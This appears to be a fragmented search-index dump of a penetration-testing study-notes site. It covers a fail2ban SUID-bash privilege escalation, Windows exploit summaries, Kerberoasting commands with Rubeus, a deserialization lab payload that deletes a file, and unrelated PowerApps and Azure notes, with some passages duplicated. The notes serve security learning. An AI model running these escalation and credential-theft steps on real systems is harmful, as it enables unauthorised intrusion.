that if we retry ssh connection six times (so we exceed the maxretry parameter), the file  /etc/fail2ban/action.d/iptables-multiport.conf will be executed as root, and as a consequence, our host will be banned. Now, as part of the security group michael does have rwx permissions on the parent folder /etc/fail2ban/action.d, but not on the file /etc/fail2ban/action.d/iptables-multiport.conf:</p> <pre><code>ls -la /etc/fail2ban/action.d/iptables-multiport.conf\n</code></pre> <p>Result:</p> <pre><code>-rw-r--r-- 1 root root 1420 Oct 20 12:48 iptables-multiport.conf\n</code></pre> <p>We need then, to be able to edit that file to include our malicious code. As the service fail2ban is restarted every minute or so, you need to execute the following commands quickly. They will allow you to overwrite the file /etc/fail2ban/action.d/iptables-multiport.conf:</p> <pre><code># create a copy of the file to have rwx permissions\nmv /etc/fail2ban/action.d/iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.conf.bak\n# overwrite the existing file with your copy\ncp /etc/fail2ban/action.d/iptables-multiport.conf.bak /etc/fail2ban/action.d/iptables-multiport.conf\n# edit the file and add your lines\nnano /etc/fail2ban/action.d/iptables-multiport.conf\n# In the file, comment the line with the  actionban definition and\n# add:\n# actionban = chmod +s /bin/bash\n# Also in the file, comment the line with the  actionunban definition and\n# add:\n# actionunban = chmod +s /bin/bash\n# CTRL-X -   Yes and ENTER to save changes.\n</code></pre> <p>With \"chmod +s /bin/bash\" we're going to give the suid bit to bash. The suid bit provides the user running it the same privileges that the user who created it. In this case, root is the user who created it. If we run it, we'll have root privileges during its execution. The next step is restarting the service to get the file iptables-multiport.conf updated.</p> <pre><code>sudo /etc/init.d/fail2ban restart\n</code></pre> <p>Now, when we fail to login into the system with ssh more than 5 times, the configuration set in iptables-multiport.conf will take place.

This flaw made it extremely easy to infiltrate a Windows host. It was so efficient that the Conficker worm was using it to infect every vulnerable host it came across. Even Stuxnet took advantage of this vulnerability. <code>Eternal Blue</code> MS17-010 is an exploit leaked in the Shadow Brokers dump from the NSA. This exploit was most notably used in the WannaCry ransomware and NotPetya cyber attacks. This attack took advantage of a flaw in the SMB v1 protocol allowing for code execution. EternalBlue is believed to have infected upwards of 200,000 hosts just in 2017 and is still a common way to find access into a vulnerable Windows host. <code>PrintNightmare</code> A remote code execution vulnerability in the Windows Print Spooler. With valid credentials for that host or a low privilege shell, you can install a printer, add a driver that runs for you, and grants you system-level access to the host. This vulnerability has been ravaging companies through 2021. 0xdf wrote an awesome post on it\u00a0here. <code>BlueKeep</code> CVE 2019-0708 is a vulnerability in Microsoft's RDP protocol that allows for Remote Code Execution. This vulnerability took advantage of a miss-called channel to gain code execution, affecting every Windows revision from Windows 2000 to Server 2008 R2. <code>Sigred</code> CVE 2020-1350 utilized a flaw in how DNS reads SIG resource records. It is a bit more complicated than the other exploits on this list, but if done correctly, it will give the attacker Domain Admin privileges since it will affect the domain's DNS server which is commonly the primary Domain Controller. <code>SeriousSam</code> CVE 2021-36924 exploits an issue with the way Windows handles permission on the\u00a0<code>C:\\Windows\\system32\\config</code>\u00a0folder. Before fixing the issue, non-elevated users have access to the SAM database, among other files. This is not a huge issue since the files can't be accessed while in use by the pc, but this gets dangerous when looking at volume shadow copy backups. These same privilege mistakes exist on the backup files as well, allowing an attacker to read the SAM database, dumping credentials. <code>Zerologon</code> CVE 2020-1472 is a critical vulnerability that exploits a cryptographic flaw in Microsoft\u2019s Active Directory Netlogon Remote Protocol (MS-NRPC). It allows users to log on to servers using NT LAN Manager (NTLM) and even send account changes via the protocol. The attack can be a bit complex, but it is trivial to execute since an attacker would have to make around 256 guesses at a computer account password before finding what they need. This can happen in a matter of a few seconds.","tags":["privilege escalation","windows"]},{"location":"information-gathering/","title":"Information gathering","text":"Sources for these notes <ul> <li>Hack The Box: Penetration Testing Learning Path</li> <li>INE eWPT2 Preparation course</li> <li>OWASP Web Security Testing Guide 4.2 &gt; 1.

At the core of\u00a0<code>virtual hosting</code>\u00a0is the ability of web servers to distinguish between multiple websites or applications sharing the same IP address. This is achieved by leveraging the\u00a0<code>HTTP Host</code>\u00a0header, a piece of information included in every\u00a0<code>HTTP</code>\u00a0request sent by a web browser. The key difference between\u00a0<code>VHosts</code>\u00a0and\u00a0<code>subdomains</code>\u00a0is their relationship to the\u00a0<code>Domain Name System (DNS)</code>\u00a0and the web server's configuration.</p> <p>There are 3 ways to configure virtual hosts:</p> <ol> <li><code>Name-Based Virtual Hosting</code>: This method relies solely on the\u00a0<code>HTTP Host header</code>\u00a0to distinguish between websites. It is the most common and flexible method, as it doesn't require multiple IP addresses. It requires the web server to support name-based\u00a0<code>virtual hosting</code>\u00a0and can have limitations with certain protocols like\u00a0<code>SSL/TLS</code>.</li> <li><code>IP-Based Virtual Hosting</code>: This type of hosting assigns a unique IP address to each website hosted on the server.

The membership of this group must be limited. This group is use to modify the schema of forest. Additional accounts must only be added when changes to the schema are necessary and then must be removed. By default, the Administrator account is a member of this group. Because this group has significant power in the forest, add users with caution. Members can modify the Active Directory schema structure and can backdoor any to-be-created Group/GPO by adding a compromised account to the default object ACL.\nGet-ADGroup -Identity \"Schema Admins\" -Properties *\n\n# Default Administrators | Domain Admins and Enterprise Admins \"super\" groups. A built-in group . Grants complete and unrestricted access to the computer, or if the computer is promoted to a domain controller, members have unrestricted access to the domain. This group cannot be renamed, deleted, or moved. This built-in group controls access to all the domain controllers in its domain, and it can change the membership of all administrative groups. Membership can be modified by members of the following groups: the default service Administrators, Domain Admins in the domain, or Enterprise Admins.\nGet-ADGroup -Identity \"Administrators\" -Properties *\n\n# Server Operators | A built-in group that exists only on domain controllers. By default, the group has no members. Server Operators can log on to a server interactively; create and delete network shares; start and stop services; back up and restore files; format the hard disk of the computer; and shut down the computer. Members can modify services, access SMB shares, and backup files. \nGet-ADGroup -Identity \"Server Operators\" -Properties *\n\n# Backup Operators | A built-in group. By default, the group has no members. Backup Operators can back up and restore all files on a computer, regardless of the permissions that protect those files. Backup Operators also can log on to the computer and shut it down. Members are allowed to log onto DCs locally and should be considered Domain Admins. They can make shadow copies of the SAM/NTDS database, read the registry remotely, and access the file system on the DC via SMB. This group is sometimes added to the local Backup Operators group on non-DCs. \nGet-ADGroup -Identity \"Backup Operators\" -Properties *\n\n# Print Operators | A built-in group that exists only on domain controllers. By default, the only member is the Domain Users group. Print Operators can manage printers and document queues. They can also manage Active Directory printer objects in the domain. Members of this group can locally sign in to and shut down domain controllers in the domain. Because members of this group can load and unload device drivers on all domain controllers in the domain, add users with caution. This group cannot be renamed, deleted, or moved. Members are allowed to logon to DCs locally and \"trick\" Windows into loading a malicious driver. \nGet-ADGroup -Identity \"Print Operators\" -Properties *\n\n# Hyper-V Administrators | Members of the Hyper-V Administrators group have complete and unrestricted access to all the features in Hyper-V. Adding members to this group helps reduce the number of members required in the Administrators group, and further separates access. If there are virtual DCs, any virtualization admins, such as members of Hyper-V Administrators, should be considered Domain Admins.\nGet-ADGroup -Identity \"Hyper-V Administrators\" -Properties *\n\n# Account Operators | Grants limited account creation privileges to a user. Members of this group can create and modify most types of accounts, including those of users, local groups, and global groups, and members can log in locally to domain controllers. Members of the Account Operators group cannot manage the Administrator user account, the user accounts of administrators, or the Administrators, Server Operators, Account Operators, Backup Operators, or Print Operators groups. Members of this group cannot modify user rights. Members can modify non-protected accounts and groups in the domain. \nGet-ADGroup -Identity \"Account Operators\" -Properties *\n\n# Remote Desktop Users | The Remote Desktop Users group on an RD Session Host server is used to grant users and groups permissions to remotely connect to an RD Session Host server. This group cannot be renamed, deleted, or moved. It appears as a SID until the domain controller is made the primary domain controller and it holds the operations master role (also known as flexible single master operations or FSMO). Members are not given any useful permissions by default but are often granted additional rights such as Allow Login Through Remote Desktop Services and can move laterally using the RDP protocol.\nGet-ADGroup -Identity \"Remote Desktop Users\" -Properties *\n\n# Remote Management Users | Members of the Remote Management Users group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user. The Remote Management Users group is generally used to allow users to manage servers through the Server Manager console, whereas the WinRMRemoteWMIUsers_ group is allows remotely running Windows PowerShell commands. Members are allowed to logon to DCs with PSRemoting (This group is sometimes added to the local remote management group on non-DCs). \nGet-ADGroup -Identity \"Remote Management Users\" -Properties *\n\n# Group Policy Creator Owners | A global group that is authorized to create new Group Policy objects in Active Directory. By default, the only member of the group is Administrator. The default owner of a new Group Policy object is usually the user who created it. If the user is a member of Administrators or Domain Admins, all objects that are created by the user are owned by the group. Owners have full control of the objects they own. Members can create new GPOs but would need to be delegated additional permissions to link GPOs to a container such as a domain or OU.\nGet-ADGroup -Identity \"Group Policy Creator Owners\" -Properties *\n\n# DNSAdmins | Members of this group have administrative access to the DNS Server service. The default permissions are as follows: Allow: Read, Write, Create All Child objects, Delete Child objects, Special Permissions. This group has no default members. Members have the ability to load a DLL on a DC but do not have the necessary permissions to restart the DNS server. They can load a malicious DLL and wait for a reboot as a persistence mechanism. Loading a DLL will often result in the service crashing.

However, this falls short of fully capturing CIM's ability not only to describe these managed elements and the management information, but also to actively control and manage them.

Even Stuxnet took advantage of this vulnerability. <code>Eternal Blue</code> MS17-010 is an exploit leaked in the Shadow Brokers dump from the NSA. This exploit was most notably used in the WannaCry ransomware and NotPetya cyber attacks. This attack took advantage of a flaw in the SMB v1 protocol allowing for code execution. EternalBlue is believed to have infected upwards of 200,000 hosts just in 2017 and is still a common way to find access into a vulnerable Windows host. <code>PrintNightmare</code> A remote code execution vulnerability in the Windows Print Spooler. With valid credentials for that host or a low privilege shell, you can install a printer, add a driver that runs for you, and grants you system-level access to the host. This vulnerability has been ravaging companies through 2021. 0xdf wrote an awesome post on it here. <code>BlueKeep</code> CVE 2019-0708 is a vulnerability in Microsoft's RDP protocol that allows for Remote Code Execution. This vulnerability took advantage of a miss-called channel to gain code execution, affecting every Windows revision from Windows 2000 to Server 2008 R2. <code>Sigred</code> CVE 2020-1350 utilized a flaw in how DNS reads SIG resource records. It is a bit more complicated than the other exploits on this list, but if done correctly, it will give the attacker Domain Admin privileges since it will affect the domain's DNS server which is commonly the primary Domain Controller. <code>SeriousSam</code> CVE 2021-36924 exploits an issue with the way Windows handles permission on the <code>C:\\Windows\\system32\\config</code> folder. Before fixing the issue, non-elevated users have access to the SAM database, among other files. This is not a huge issue since the files can't be accessed while in use by the pc, but this gets dangerous when looking at volume shadow copy backups. These same privilege mistakes exist on the backup files as well, allowing an attacker to read the SAM database, dumping credentials. <code>Zerologon</code> CVE 2020-1472 is a critical vulnerability that exploits a cryptographic flaw in Microsoft\u2019s Active Directory Netlogon Remote Protocol (MS-NRPC). It allows users to log on to servers using NT LAN Manager (NTLM) and even send account changes via the protocol.

The \"V\" in VPN stands for Virtual, and means that you are not actually on the same link as the other hosts in your subnet, so you can't get information about their link-layer connections any more than they can know whether you've connected to the VPN via Starbucks WiFi, an Ethernet cable, or a dial-up modem.</p> <p>You are further limited by the fact that Windows does not offer a general-purpose raw socket interface, so Nmap can't craft special packets at the network/internet layer. Usually we work around this by crafting Ethernet (link-layer) frames and injecting those with\u00a0Npcap, but VPN links do not use Ethernet frames, so that method doesn't work. We hope to be able to add this functionality in the future, but for now, VPNs are tricky to use with Npcap, and we haven't implemented PPTP or other VPN framing in Nmap to make it work.

The contractor agrees to treat all confidential information brought to its attention as strictly confidential, even after the order/project is completed. Furthermore, any exceptions to confidentiality, the transferability of rights and obligations, and contractual penalties shall be stipulated in the agreement. The NDA should be signed before the kick-off meeting or at the latest during the meeting before any information is discussed in detail. <code>\u2610 Goals</code> Goals are milestones that must be achieved during the order/project. In this process, goal setting is started with the significant goals and continued with fine-grained and small ones. <code>\u2610 Scope</code> The individual components to be tested are discussed and defined. These may include domains, IP ranges, individual hosts, specific accounts, security systems, etc. Our customers may expect us to find out one or the other point by ourselves. However, the legal basis for testing the individual components has the highest priority here. <code>\u2610 Penetration Testing Type</code> When choosing the type of penetration test, we present the individual options and explain the advantages and disadvantages. Since we already know the goals and scope of our customers, we can and should also make a recommendation on what we advise and justify our recommendation accordingly. Which type is used in the end is the client's decision. <code>\u2610 Methodologies</code> Examples: OSSTMM, OWASP, automated and manual unauthenticated analysis of the internal and external network components, vulnerability assessments of network components and web applications, vulnerability threat vectorization, verification and exploitation, and exploit development to facilitate evasion techniques. <code>\u2610 Penetration Testing Locations</code> External: Remote (via secure VPN) and/or Internal: Internal or Remote (via secure VPN) <code>\u2610 Time Estimation</code> For the time estimation, we need the start and the end date for the penetration test. This gives us a precise time window to perform the test and helps us plan our procedure. It is also vital to explicitly ask how time windows the individual attacks (Exploitation / Post-Exploitation / Lateral Movement) are to be carried out. These can be carried out during or outside regular working hours. When testing outside regular working hours, the focus is more on the security solutions and systems that should withstand our attacks. <code>\u2610 Third Parties</code> For the third parties, it must be determined via which third-party providers our customer obtains services. These can be cloud providers, ISPs, and other hosting providers. Our client must obtain written consent from these providers describing that they agree and are aware that certain parts of their service will be subject to a simulated hacking attack. It is also highly advisable to require the contractor to forward the third-party permission sent to us so that we have actual confirmation that this permission has indeed been obtained. <code>\u2610 Evasive Testing</code> Evasive testing is the test of evading and passing security traffic and security systems in the customer's infrastructure. We look for techniques that allow us to find out information about the internal components and attack them. It depends on whether our contractor wants us to use such techniques or not. <code>\u2610 Risks</code> We must also inform our client about the risks involved in the tests and the possible consequences. Based on the risks and their potential severity, we can then set the limitations together and take certain precautions. <code>\u2610 Scope Limitations &amp; Restrictions</code> It is also essential to determine which servers, workstations, or other network components are essential for the client's proper functioning and its customers.

This may involve e-mail correspondence, telephone calls, or personal meetings. <code>\u2610 Reporting</code> Apart from the report's structure, any customer-specific requirements the report should contain are also discussed.

There 3 types:</p> <ul> <li>Contextual variables: Variables is only active when you are on the screen.</li> <li>Global variables: they are accessible from all screens in the application.</li> <li>Collection variables.</li> </ul> <p>How to set up a contextual variable. Select an element in the screen. Select \"OnSelect\" and add the function:</p> <pre><code>UpdateContext({FirstNumber: TextInput.Text})\n# When you select an element, for instance an input field, it will create a variable called FirstNumber and it will assign it the value of the input field that you have selected\n</code></pre> <p>How to set up a global variable. By using the SET function</p> <pre><code>Set(CounterGlobal, CounterGlobal+1)\n</code></pre> <p>Collections variable are useful for datatables and galleries.</p> <p>Example. Create a button and OnSelect that button add this function:</p> <pre><code>Collect(OurCollection, {First: \"Ben\", Second: \"Dover\"})\n# that it's creating a collection called our collection. It's creating two columns in that. The first column is called first. The second column is called second. And the first record in the first column is Ben, and the first record in the second column is called Dover.\n</code></pre> <p>Create a Gallery, and as Data source, add your collection. This way everytime you click on that button you will be adding \"Ben\" and \"Dover\" as a card to that gallery. Of course you can substitute those two static texts to references to inputs fields:</p> <pre><code>Collect(OurCollection, {First: \"TextInput4.Text\", Second: \"TextInput5.Text\"})\n</code></pre> <p>To remove an item from a collection, add a icon-button for removing and onSelect:</p> <pre><code>Remove(OurCollection, ThisItem)\n</code></pre> <p>Filtering cards displayed in a gallery. Select the Gallery, onSelect:</p> <pre><code>Search(NameOfTable, &lt;ElementToSearch&gt;, &lt;WhichColumnsSearchinTable&gt;)\n\n# For example, to display all cards in connected table \"Table1\":\nSearch(Table1, \"\", \"FirstName\")\n\n# To make it dependable on user's input, create an input field and\nSearch(Table1, TexInput1.Text, \"FirstName\", \"LastName\", \"Location\")\n</code></pre> <p>Only show the search input if someone click on the search icon. </p> <ul> <li>Set the Input search box default visibility to False.</li> <li> <p>Insert a magnifier icon. OnSelect:</p> <pre><code>UpdateContext({SearchVisible: True})\n</code></pre> </li> <li> <p>Modify the search input field. When Visible: </p> <pre><code>SearchVisible\n</code></pre> </li> </ul> <p>To trigger SearchVisible to false (and hide search input field), we will modify the magnifier icon, onSelect:</p> <pre><code>```\nUpdateContext({SearchVisible: !SearchVisible})\n```\n</code></pre> <p>More interesting formulas is Filter</p> <pre><code># An example of a multi-layered built function, with Filter and Search functionality. Create a dropdown menu &gt; Items\nFilter(Search(Table1, TexInput1.Text, \"FirstName\", \"LastName\", \"Location\"), VIPLevel = Dropdown.Selected.Value)\n</code></pre> <p>And also SubmitForm, which aggregates all the updates in a form control and submits the form.</p> <pre><code>SubmitForm(FormName)\n</code></pre>","tags":["database","cheat","sheet"]},{"location":"powerapps-pentesting/#well-known-vulnerabilities-under-build","title":"Well-known vulnerabilities (under build)","text":"","tags":["database","cheat","sheet"]},{"location":"powerapps-pentesting/#data-exposure","title":"Data exposure","text":"<p>https://rencore.com/en/blog/how-to-prevent-the-next-microsoft-power-apps-data-leak-from-happening</p> <p>From https://dev.to/wyattdave/ive-just-been-hacked-by-a-power-app-1fj4</p>","tags":["database","cheat","sheet"]},{"location":"powerapps-pentesting/#not-using-service-accounts","title":"Not using Service accounts","text":"<p>The security issue is all around how the Power Platform handles credentials, with each user/owner signing in and storing their credentials in connections.

Here are just a few examples of applications that use DPAPI and what they use it for:</li> </ul> Applications Use of DPAPI <code>Internet Explorer</code> Password form auto-completion data (username and password for saved sites). <code>Google Chrome</code> Password form auto-completion data (username and password for saved sites). <code>Outlook</code> Passwords for email accounts. <code>Remote Desktop Connection</code> Saved credentials for connections to remote machines. <code>Credential Manager</code> Saved credentials for accessing shared resources, joining Wireless networks, VPNs and more. <p>Mimikatz and Pypykatz can extract the DPAPI <code>masterkey</code> for the logged-on user whose data is present in LSASS process memory. This masterkey can then be used to decrypt the secrets associated with each of the applications using DPAPI and result in the capturing of credentials for various accounts.</p>","tags":["windows","dump hashes","passwords"]},{"location":"rar-winrar/","title":"rar - Winrar","text":"","tags":["web","pentesting","tools"]},{"location":"rar-winrar/#installation","title":"Installation","text":"<pre><code> wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz\n\ntar -xzvf rarlinux-x64-612.tar.gz &amp;&amp; cd rar\n</code></pre>","tags":["web","pentesting","tools"]},{"location":"rar-winrar/#basic-use","title":"Basic use","text":"<pre><code>rar a ~/test.rar -p ~/test.\n</code></pre>","tags":["web","pentesting","tools"]},{"location":"rdesktop/","title":"rdesktop","text":"<p>rdesktop is an open source UNIX client for connecting to Windows Remote Desktop Services, capable of natively speaking Remote Desktop Protocol (RDP) in order to present the user's Windows desktop.</p>","tags":["tools","windows","rdp"]},{"location":"rdesktop/#installation","title":"Installation","text":"<p>Preinstalled in Kali.</p> <pre><code>sudo apt-get install rdesktop\n</code></pre>","tags":["tools","windows","rdp"]},{"location":"rdesktop/#basic-usage","title":"Basic usage","text":"<pre><code>rdesktop $ip\n\n# Mounting a Linux Folder Using rdesktop\nrdesktop $ip -d &lt;domain&gt; -u &lt;username&gt; -p &lt;'Password0@'&gt; -r disk:linux='/home/user/rdesktop/files'\n</code></pre>","tags":["tools","windows","rdp"]},{"location":"regex/","title":"Mastering Regular Expressions - Regex","text":"<p>The implementation system of regex functionality is often called \"regular expression engine\".

It will always return a service ticket encrypted with the highest level of encryption supported by the target account. This being said, if we find ourselves in a domain with Domain Controllers running on Server 2016 or earlier (which is quite common), enabling AES will not partially mitigate Kerberoasting by only returning AES encrypted tickets, which are much more difficult to crack, but rather will allow an attacker to request an RC4 encrypted service ticket. In Windows Server 2019 DCs, enabling AES encryption on an SPN account will result in us receiving an AES-256 (type 18) service ticket, which is substantially more difficult (but not impossible) to crack, especially if a relatively weak dictionary password is in use.</p> <p>In addition, It is possible to edit the encryption types used by Kerberos. This can be done by opening Group Policy, editing the Default Domain Policy, and choosing: Computer Configuration &gt; Policies &gt; Windows Settings &gt; Security Settings &gt; Local Policies &gt; Security Options, then double-clicking on Network security: Configure encryption types allowed for Kerberos and selecting the desired encryption type allowed for Kerberos. Removing all other encryption types except for RC4_HMAC_MD5 would allow for the above downgrade example to occur in 2019. Removing support for AES would introduce a security flaw into AD and should likely never be done. </p>","tags":["pentesting","mimikatz","kerberos"]},{"location":"rubeus/#more-commands","title":"More commands","text":"<pre><code>.\\Rubeus.exe\n\n# Gather some stats:\n .\\Rubeus.exe kerberoast /stats\n\n\n# Perform Kerberoasting:\nRubeus.exe kerberoast [[/spn:\"blah/blah\"] | [/spns:C:\\temp\\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:\"OU=,...\"] [/ldaps] [/nowrap]\n\n# Perform Kerberoasting, outputting hashes to a file:\nRubeus.exe kerberoast /outfile:hashes.txt [[/spn:\"blah/blah\"] | [/spns:C:\\temp\\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:\"OU=,...\"] [/ldaps]\n\n\n# Perform Kerberoasting, outputting hashes in the file output format, but to the console:\nRubeus.exe kerberoast /simple [[/spn:\"blah/blah\"] | [/spns:C:\\temp\\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:\"OU=,...\"] [/ldaps] [/nowrap]\n\n# Perform Kerberoasting with alternate credentials:\nRubeus.exe kerberoast /creduser:DOMAIN.FQDN\\USER /credpassword:PASSWORD [/spn:\"blah/blah\"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:\"OU=,...\"] [/ldaps] [/nowrap]\n\n# Perform Kerberoasting with an existing TGT:\nRubeus.exe kerberoast &lt;/spn:\"blah/blah\" | /spns:C:\\temp\\spns.txt&gt; &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt; [/nowrap]\n\n# Perform Kerberoasting with an existing TGT using an enterprise principal:\nRubeus.exe kerberoast &lt;/spn:user@domain.com | /spns:user1@domain.com,user2@domain.com&gt; /enterprise &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt; [/nowrap]\n\n# Perform Kerberoasting with an existing TGT and automatically retry with the enterprise principal if any fail:\nRubeus.exe kerberoast &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt; /autoenterprise [/ldaps] [/nowrap]\n\n# Perform Kerberoasting using the tgtdeleg ticket to request service tickets - requests RC4 for AES accounts:\nRubeus.exe kerberoast /usetgtdeleg [/ldaps] [/nowrap]\n\n# Perform \"opsec\" Kerberoasting, using tgtdeleg, and filtering out AES-enabled accounts:\nRubeus.exe kerberoast /rc4opsec [/ldaps] [/nowrap]\n\n# List statistics about found Kerberoastable accounts without actually sending ticket requests:\nRubeus.exe kerberoast /stats [/ldaps] [/nowrap]\n\n# Perform Kerberoasting, requesting tickets only for accounts with an admin count of 1 (custom LDAP filter):\nRubeus.exe kerberoast /ldapfilter:'admincount=1' [/ldaps] [/nowrap]\n\n# Perform Kerberoasting, requesting tickets only for accounts whose password was last set between 01-31-2005 and 03-29-2010, returning up to 5 service tickets:\nRubeus.exe kerberoast /pwdsetafter:01-31-2005 /pwdsetbefore:03-29-2010 /resultlimit:5 [/ldaps] [/nowrap]\n\n# Perform Kerberoasting, with a delay of 5000 milliseconds and a jitter of 30%:\nRubeus.exe kerberoast /delay:5000 /jitter:30 [/ldaps] [/nowrap]\n\n# Perform AES Kerberoasting:\nRubeus.exe kerberoast /aes [/ldaps] [/nowrap]\n</code></pre>","tags":["pentesting","mimikatz","kerberos"]},{"location":"samba-suite/","title":"Samba Suite","text":"<p>It\u2019s used to enumerate info.

This module also allows an attacker to leverage another privilege escalation vuln.

Obtain proper authorization and permission from the application owner to conduct the test.  Gather relevant information about the application, such as technologies used, user roles, and business-critical functionalities. 2 Information Gathering &amp; Reconnaissance Perform passive reconnaissance to gather publicly available information about the application and its infrastructure.  Enumerate subdomains, directories, and files to discover hidden or sensitive content.  Use tools like \"Nmap\" to identify open ports and services running on the web server.  Utilize \"Google Dorks\" to find indexed information, files, and directories on the target website. 3 Threat Modeling Analyze the application's architecture and data flow to identify potential threats and attack vectors.  Build an attack surface model to understand how attackers can interact with the application.  Identify potential high-risk areas and prioritize testing efforts accordingly. 4 Vulnerability Scanning Use automated web vulnerability scanners like \"Burp Suite\" or \"OWASP ZAP\" to identify common security flaws.  Verify and validate the scan results manually to eliminate false positives and false negatives. 5 Manual Testing &amp; Exploitation Perform manual testing to validate and exploit identified vulnerabilities in the application.  Test for input validation issues, authentication bypass, authorization flaws, and business logic vulnerabilities.  Attempt to exploit security flaws to demonstrate their impact and potential risk to the application. 6 Authentication &amp; Authorization Testing Test the application's authentication mechanisms to identify weaknesses in password policies, session management, and account lockout procedures.  Evaluate the application's access controls to ensure that unauthorized users cannot access sensitive functionalities or data. 7 Session Management Testing Evaluate the application's session management mechanisms to prevent session fixation, session hijacking, and session-related attacks.  Check for session timeout settings and proper session token handling. 8 Information Disclosure Review how the application handles sensitive information such as passwords, user data, and confidential files.  Test for information disclosure through error messages, server responses, or improper access controls. 9 Business Logic Testing Analyze the application's business logic to identify flaws that could lead to unauthorized access or data manipulation.  Test for order-related vulnerabilities, privilege escalation, and other business logic flaws. 10 Client-Side Testing Evaluate the client-side code (HTML, JavaScript) for potential security vulnerabilities, such as DOM-based XSS.  Test for insecure client-side storage and sensitive data exposure. 11 Reporting &amp; Remediation Document and prioritize the identified security vulnerabilities and risks.  Provide a detailed report to developers and stakeholders, including recommendations for remediation.  Assist developers in fixing the identified security issues and retesting the application to ensure that the fixes were successful. 12 Post-Engagement Conduct a post-engagement meeting to discuss the test results with stakeholders.  Provide security awareness training to the development team to promote secure coding practices. <p>Other methodologies:  http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines PTES is a complete penetration testing methodology that covers all aspects of security assessments, including web application testing.

A sink is a potentially dangerous JavaScript function or DOM object that can cause undesirable effects if attacker-controlled data is passed to it.

Kiterunner is currently the best tool available for discovering API endpoints and resources. While directory brute force tools like Gobuster/Dirbuster/ work to discover URL paths, it typically relies on standard HTTP GET requests. Kiterunner will not only use all HTTP request methods common with APIs (GET, POST, PUT, and DELETE) but also mimic common API path structures. In other words, instead of requesting GET /api/v1/user/create, Kiterunner will try POST /api/v1/user/create, mimicking a more realistic request.</p> <p>1. First, download the dictionaries from the project. In my case I downloaded it to /usr/share/wordlists/kiterunner/:</p> <ul> <li>https://wordlists-cdn.assetnote.io/rawdata/kiterunner/routes-large.json.tar.gz</li> <li>https://wordlists-cdn.assetnote.io/rawdata/kiterunner/routes-small.json.tar.gz</li> <li>https://wordlists-cdn.assetnote.io/data/kiterunner/routes-large.kite.tar.gz</li> <li>https://wordlists-cdn.assetnote.io/data/kiterunner/routes-small.kite.tar.gz</li> </ul> <p>2. Run a quick scan of your target\u2019s URL or IP address like this:</p> <pre><code>kr scan HTTP://127.0.0.1 -w ~/api/wordlists/data/kiterunner/routes-large.kite  \n</code></pre> <p>But.

And if it happens while you're flashing the bootloader, it will require a JTAG device to unbrick the Proxmark3.

In Decoder, highlight the token and then select **Decode as &gt; Base64**. Notice that the token is actually a serialized PHP object.\n5. In Burp Repeater, observe that if you try sending a request with a modified cookie, an exception is raised because the digital signature no longer matches. However, you should notice that:\n    - A developer comment discloses the location of a debug file at `/cgi-bin/phpinfo.php`.\n    - The error message reveals that the website is using the Symfony 4.3.6 framework.\n6. Request the `/cgi-bin/phpinfo.php` file in Burp Repeater and observe that it leaks some key information about the website, including the `SECRET_KEY` environment variable. Save this key; you'll need it to sign your exploit later.\n7. Download the \"PHPGGC\" tool and execute the following command:\n\n    `./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64`\n\n    This will generate a Base64-encoded serialized object that exploits an RCE gadget chain in Symfony to delete Carlos's `morale.txt` file.\n\n8. You now need to construct a valid cookie containing this malicious object and sign it correctly using the secret key you obtained earlier. You can use the following PHP script to do this. Before running the script, you just need to make the following changes:\n\n    - Assign the object you generated in PHPGGC to the `$object` variable.\n    - Assign the secret key that you copied from the `phpinfo.php` file to the `$secretKey` variable.\n\n    `&lt;?php $object = \"OBJECT-GENERATED-BY-PHPGGC\"; $secretKey = \"LEAKED-SECRET-KEY-FROM-PHPINFO.PHP\"; $cookie = urlencode('{\"token\":\"' . $object .

Each resource provider offers operations for working with the resources that are deployed. Some common resource providers are Microsoft.Compute, which supplies the virtual machine resource, Microsoft.Storage, which supplies the storage account resource, and Microsoft.Web, which supplies resources related to web apps. The Microsoft.KeyVault resource provider offers a resource type called vaults for creating the key vault, useful if you want to store keys and secrets. The name of a resource type is in the format: {resource-provider}/{resource-type}. For example, the key vault type is Microsoft.KeyVault/vaults.</li> <li>declarative syntax\u00a0- Syntax that lets you state \"Here is what I intend to create\" without having to write the sequence of programming commands to create it. The Resource Manager template is an example of declarative syntax.

Limitations do apply to\u00a0moving resources.</li> <li>A resource group can contain resources that reside in different regions.</li> <li>A resource group can be used to scope access control for administrative actions.</li> <li>A resource can interact with resources in other resource groups. This interaction is common when the two resources are related but don't share the same lifecycle (for example, web apps connecting to a database).</li> </ul> <p>When creating a resource group, you need to provide a location for that resource group. You may be wondering, \"Why does a resource group need a location? And, if the resources can have different locations than the resource group, why does the resource group location matter at all?\" The resource group stores metadata about the resources. Therefore, when you specify a location for the resource group, you're specifying where that metadata is stored. For compliance reasons, you may need to ensure that your data is stored in a particular region.</p> <p>Moving resources:</p> <p>When moving resources, both the source group and the target group are locked during the operation. Write and delete operations are blocked on the resource groups until the move completes. This lock means you can't add, update, or delete resources in the resource groups. Locks don't mean the resources aren't available.

These are some benefits:</p> <ul> <li>Templates improve consistency. Resource Manager templates provide a common language for you and others to describe your deployments. Regardless of the tool or SDK that you use to deploy the template, the structure, format, and expressions inside the template remain the same.</li> <li>Templates help express complex deployments. Templates enable you to deploy multiple resources in the correct order. For example, you wouldn't want to deploy a virtual machine prior to creating an operating system (OS) disk or network interface. Resource Manager maps out each resource and its dependent resources, and creates dependent resources first. Dependency mapping helps ensure that the deployment is carried out in the correct order.</li> <li>Templates reduce manual, error-prone tasks. Manually creating and connecting resources can be time consuming, and it's easy to make mistakes. Resource Manager ensures that the deployment happens the same way every time.</li> <li>Templates are code. Templates express your requirements through code. Think of a template as a type of Infrastructure as Code that can be shared, tested, and versioned similar to any other piece of software. Also, because templates are code, you can create a \"paper trail\" that you can follow. The template code documents the deployment. Most users maintain their templates under some kind of revision control, such 